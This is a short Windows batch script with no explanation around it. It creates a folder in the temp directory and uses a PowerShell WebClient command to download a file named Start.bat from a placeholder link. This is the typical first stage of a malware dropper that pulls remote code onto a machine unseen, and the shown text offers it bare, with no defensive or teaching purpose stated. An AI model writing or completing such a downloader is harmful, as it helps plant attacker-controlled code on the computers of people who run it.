@echo off
color 0c
cls

cd %temp%
if not exist "StartFile" mkdir "StartFile"
cd StartFile

powershell -command (New-Object System.Net.WebClient).DownloadFile('<LINK>', "Start.bat")

exit
